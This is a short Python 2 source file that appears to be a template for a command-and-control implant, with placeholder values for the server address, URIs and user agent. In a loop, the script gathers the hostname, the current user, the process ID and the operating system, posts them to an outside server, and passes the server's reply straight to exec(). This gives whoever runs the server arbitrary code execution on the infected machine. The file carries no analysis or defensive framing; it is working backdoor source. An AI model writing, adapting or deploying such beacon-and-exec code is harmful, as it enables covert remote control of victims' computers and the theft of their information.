import urllib2, json, getpass, os, platform, socket, sys, time


external_address = "EXTERNAL_ADDRESS"
port = "PORT"
protocol = "PROTOCOL"
beacon_uri = "BEACON_URI"
update_uri = "UPDATE_URI"
user_agent = "USER_AGENT"
sleep_interval = "SLEEP_INTERVAL"
beacon_url = protocol + "://" + external_address + "/" + beacon_uri
update_url = protocol + "://" + external_address + "/" + update_uri


def get_system_info():
    hostname = socket.gethostname()
    current_user = getpass.getuser()
    process_id = os.getpid()

    if "Darwin" in platform.system():
        operating_system = "Mac OS X " + platform.mac_ver()[0]
    else:
        operating_system = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]

    return (hostname, current_user, process_id, operating_system)


def beacon(hostname, current_user, process_id, operating_system):
    post_data = {
        "hostname": hostname,
        "current_user": current_user,
        "process_id": process_id,
        "os": operating_system
    }

    request = urllib2.Request(beacon_url)
    request.add_header("Content-Type", "application/json")
    request.add_header("User-Agent", user_agent)
    f = urllib2.urlopen(request, json.dumps(post_data))
    response = f.read()
    return response


if __name__ == "__main__":
    while True:
        hostname, current_user, process_id, operating_system = get_system_info()
        exec(beacon(hostname, current_user, process_id, operating_system))
        time.sleep(sleep_interval)
